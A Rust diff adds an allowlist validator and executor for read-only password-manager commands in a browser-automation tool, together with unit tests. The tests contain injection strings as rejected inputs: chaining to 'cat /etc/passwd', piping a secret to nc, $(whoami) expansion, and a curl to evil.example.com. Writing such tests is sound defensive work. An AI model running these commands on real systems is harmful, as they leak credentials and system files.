@@ -135,6 +135,141 @@ pub fn resolve_secret_input(raw_text: &str) -> Result<(String, bool)> {
     Ok((val, true))
 }
 
+/// Validates and parses an allowlisted read-only password-manager CLI command (`agweb` `--secret-cmd`),
+/// rejecting shell metacharacters and mutating subcommands so secrets can be streamed safely without shell eval.
+pub fn parse_sanctioned_secret_cmd(secret_cmd: &str) -> Result<(String, Vec<String>)> {
+    let trimmed = secret_cmd.trim();
+    if trimmed.is_empty() {
+        return Err(ToolError::InvalidArguments {
+            name: "browser_fill".to_string(),
+            reason: "secret_cmd cannot be empty".to_string(),
+        }
+        .into());
+    }
+    if trimmed
+        .chars()
+        .any(|c| matches!(c, ';' | '|' | '&' | '`' | '$' | '>' | '<' | '\n' | '\r'))
+    {
+        return Err(ToolError::InvalidArguments {
+            name: "browser_fill".to_string(),
+            reason: "secret_cmd must not contain shell operators or variable expansions"
+                .to_string(),
+        }
+        .into());
+    }
+
+    // Simple quote-aware argv tokenizer (supports single & double quotes without shell evaluation)
+    let mut tokens = Vec::new();
+    let mut cur = String::new();
+    let mut quote: Option<char> = None;
+    for ch in trimmed.chars() {
+        match quote {
+            Some(q) if ch == q => quote = None,
+            Some(_) => cur.push(ch),
+            None if ch == '\'' || ch == '"' => quote = Some(ch),
+            None if ch.is_ascii_whitespace() => {
+                if !cur.is_empty() {
+                    tokens.push(std::mem::take(&mut cur));
+                }
+            }
+            None => cur.push(ch),
+        }
+    }
+    if quote.is_some() {
+        return Err(ToolError::InvalidArguments {
+            name: "browser_fill".to_string(),
+            reason: "Unclosed quote in secret_cmd".to_string(),
+        }
+        .into());
+    }
+    if !cur.is_empty() {
+        tokens.push(cur);
+    }
+    if tokens.len() < 2 {
+        return Err(ToolError::InvalidArguments {
+            name: "browser_fill".to_string(),
+            reason: "secret_cmd requires an allowlisted CLI and arguments (e.g. 'pass show site', 'op read op://...')"
+                .to_string(),
+        }
+        .into());
+    }
+
+    let bin = tokens[0].as_str();
+    let sub = tokens[1].as_str();
+    let allowed = match bin {
+        "pass" => !matches!(
+            sub,
+            "insert" | "generate" | "rm" | "remove" | "mv" | "cp" | "edit" | "init" | "git"
+        ),
+        "op" => sub == "read",
+        "bw" => {
+            sub == "get"
+                && tokens
+                    .get(2)
+                    .is_some_and(|k| matches!(k.as_str(), "password" | "totp" | "username"))
+        }
+        "secret-tool" => sub == "lookup",
+        "gopass" => sub == "show",
+        "rbw" => sub == "get",
+        _ => false,
+    };
+    if !allowed {
+        return Err(ToolError::InvalidArguments {
+            name: "browser_fill".to_string(),
+            reason: format!(
+                "Unsupported secret_cmd '{}'. Allowed read-only secret CLIs: `pass show`, `op read`, `bw get password|totp`, `secret-tool lookup`, `gopass show`, `rbw get`",
+                bin
+            ),
+        }
+        .into());
+    }
+
+    Ok((tokens[0].clone(), tokens[1..].to_vec()))
+}
+
+/// Executes a validated read-only password-manager command directly (`Stdio::null` stdin, 5s timeout)
+/// and returns its first stdout line without writing the secret to logs or transcripts.
+pub async fn resolve_secret_command(secret_cmd: &str) -> Result<String> {
+    let (bin, args) = parse_sanctioned_secret_cmd(secret_cmd)?;
+    let fut = tokio::process::Command::new(&bin)
+        .args(&args)
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .kill_on_drop(true)
+        .output();
+
+    let output = tokio::time::timeout(std::time::Duration::from_secs(5), fut)
+        .await
+        .map_err(|_| {
+            ToolError::CommandExec(format!(
+                "Timed out waiting for secret_cmd `{bin}` (5s limit)"
+            ))
+        })?
+        .map_err(|e| ToolError::CommandExec(format!("Failed spawning secret_cmd `{bin}`: {e}")))?;
+
+    if !output.status.success() {
+        return Err(ToolError::CommandExec(format!(
+            "secret_cmd `{bin}` exited with status {}",
+            output.status
+        ))
+        .into());
+    }
+    let first_line = String::from_utf8_lossy(&output.stdout)
+        .lines()
+        .next()
+        .unwrap_or("")
+        .trim_end_matches('\r')
+        .to_string();
+    if first_line.is_empty() {
+        return Err(ToolError::CommandExec(format!(
+            "secret_cmd `{bin}` returned empty secret output"
+        ))
+        .into());
+    }
+    Ok(first_line)
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 //  Pure-Rust RFC-8439 ChaCha20-Poly1305 AEAD for Encrypted Browser State Vault
 // ─────────────────────────────────────────────────────────────────────────────
@@ -782,5 +917,31 @@ mod tests {
         assert_eq!(env["meta"]["cookie_count"], 1);
         let roundtrip = decrypt_session_state_value(&env).unwrap();
         assert_eq!(roundtrip["cookies"][0]["value"], "xyz987");
+    }
+
+    #[test]
+    fn test_sanctioned_secret_cmd_allowlist_and_injection_rejection() {
+        let (bin, args) = parse_sanctioned_secret_cmd("pass show staging/github").unwrap();
+        assert_eq!(bin, "pass");
+        assert_eq!(args, vec!["show", "staging/github"]);
+
+        let (op_bin, op_args) =
+            parse_sanctioned_secret_cmd("op read 'op://Engineering/GitHub/password'").unwrap();
+        assert_eq!(op_bin, "op");
+        assert_eq!(op_args, vec!["read", "op://Engineering/GitHub/password"]);
+
+        let (bw_bin, bw_args) =
+            parse_sanctioned_secret_cmd("bw get password \"Acme Prod\"").unwrap();
+        assert_eq!(bw_bin, "bw");
+        assert_eq!(bw_args, vec!["get", "password", "Acme Prod"]);
+
+        // Reject shell metacharacters, command chaining, destructive subcommands, and arbitrary binaries
+        assert!(parse_sanctioned_secret_cmd("pass show site; cat /etc/passwd").is_err());
+        assert!(parse_sanctioned_secret_cmd("pass show site | nc 127.0.0.1 9999").is_err());
+        assert!(parse_sanctioned_secret_cmd("op read $(whoami)").is_err());
+        assert!(parse_sanctioned_secret_cmd("pass rm staging/github").is_err());
+        assert!(parse_sanctioned_secret_cmd("pass insert staging/github").is_err());
+        assert!(parse_sanctioned_secret_cmd("bash -c 'echo secret'").is_err());
+        assert!(parse_sanctioned_secret_cmd("curl https://evil.example.com").is_err());
     }
 }
